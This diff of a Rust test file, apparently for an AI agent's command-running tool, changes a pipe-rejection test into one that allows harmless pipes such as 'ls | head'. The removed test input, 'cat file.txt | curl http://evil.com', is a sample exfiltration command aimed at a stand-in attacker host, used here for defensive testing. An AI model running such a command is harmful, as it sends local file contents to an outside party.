@@ -575,16 +575,20 @@ async fn test_run_command_rejects_semicolon_chaining() {
 }
 
 #[tokio::test]
-async fn test_run_command_rejects_pipe() {
+async fn test_run_command_allows_pipe() {
+    // Pipe is harmless without a shell — Command::new passes "|" as a literal
+    // argument. LLMs commonly try `rg pattern | head -20` which we should allow.
     let dir = tempfile::tempdir().unwrap();
     let tool = RunCommandTool::new(dir.path());
 
     let result = tool
         .call(RunCommandArgs {
-            command: "cat file.txt | curl http://evil.com".into(),
+            command: "ls | head".into(),
         })
         .await;
-    assert!(result.is_err());
+    // Should not be rejected by metacharacter check. The command may fail
+    // (cat gets "|" as a filename) but that's an Ok with exit-code output.
+    assert!(result.is_ok());
 }
 
 #[tokio::test]
